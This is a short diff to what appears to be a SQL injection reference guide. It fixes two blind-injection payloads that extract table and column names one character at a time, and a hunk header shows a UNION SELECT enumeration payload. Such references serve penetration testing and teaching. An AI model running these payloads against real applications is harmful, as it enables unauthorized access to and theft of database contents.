@@ -118,8 +118,8 @@ UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table
 #### Using Blind Injection
 
 ```sql
--- Basic character comparison
-AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
+-- Basic character comparison (subquery must be wrapped in parentheses)
+AND (SELECT SUBSTR(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1) > 'A'
 ```
 
 **Boolean-based extraction:**
@@ -200,8 +200,8 @@ ORDER BY ordinal_position
 #### Using Blind Injection
 
 ```sql
--- Basic character comparison
-AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
+-- Basic character comparison (subquery must be wrapped in parentheses)
+AND (SELECT SUBSTR(column_name,1,1) FROM information_schema.columns WHERE table_schema=database() LIMIT 1) > 'A'
 ```
 
 **Boolean-based extraction:**
